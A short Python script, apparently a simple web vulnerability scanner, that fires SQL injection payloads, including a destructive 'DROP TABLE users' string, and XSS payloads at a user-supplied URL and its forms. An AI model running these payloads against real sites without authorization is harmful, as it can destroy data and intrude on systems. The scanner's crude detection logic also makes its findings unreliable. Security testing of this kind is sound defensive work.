import requests
from bs4 import BeautifulSoup
sql_payloads = ["' OR '1'='1", "'; DROP TABLE users; --"]
xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
def scan_sql_injection(url):
    print("\nüîç Scanning for SQL Injection...")
    vulnerable = False
    for payload in sql_payloads:
        test_url = f"{url}?id={payload}"
        response = requests.get(test_url)
        if "sql" in response.text.lower() or "mysql" in response.text.lower():
            print(f"‚ö†Ô∏è Potential SQL Injection vulnerability found with payload: {payload}")
            vulnerable = True
    if not vulnerable:
        print("‚úÖ No SQL Injection vulnerability detected.")
def scan_xss(url):
    print("\nüîç Scanning for XSS...")
    response = requests.get(url)
    soup = BeautifulSoup(response.content, "html.parser")
    forms = soup.find_all("form")
    for form in forms:
        action = form.get("action")
        method = form.get("method", "get").lower()
        inputs = form.find_all("input")
        for payload in xss_payloads:
            data = {}
            for inp in inputs:
                if inp.get("name"):
                    data[inp.get("name")] = payload

            full_url = url if action == "" else url + "/" + action
            if method == "post":
                res = requests.post(full_url, data=data)
            else:
                res = requests.get(full_url, params=data)

            if payload in res.text:
                print(f"‚ö†Ô∏è Possible XSS vulnerability found using payload: {payload}")
                return
    print("‚úÖ No XSS vulnerability detected.")
if __name__ == "__main__":
    target_url = input("Enter the URL to scan (e.g., http://example.com/page): ")
    scan_sql_injection(target_url)
    scan_xss(target_url)